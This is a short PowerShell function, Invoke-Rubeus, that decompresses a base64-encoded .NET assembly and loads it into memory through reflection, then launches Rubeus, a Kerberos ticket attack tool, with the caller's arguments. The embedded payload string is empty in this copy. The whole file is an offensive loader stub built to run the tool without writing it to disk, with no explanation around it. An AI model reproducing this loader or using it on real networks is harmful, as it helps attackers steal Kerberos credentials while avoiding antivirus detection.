function Invoke-Rubeus {
    $EncodedCompressedFile = ''
    $DeflatedStream = New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
    $UncompressedFileBytes = New-Object Byte[](210944)
    $DeflatedStream.Read($UncompressedFileBytes, 0, 210944) | Out-Null
    $Assembly = [Reflection.Assembly]::Load($UncompressedFileBytes)
    $BindingFlags = [Reflection.BindingFlags] "Public,Static"
    $a = @()
    $Assembly.GetType("Rubeus.Program").GetMethod("Main").Invoke($Null, @(,[string[]]$args))
}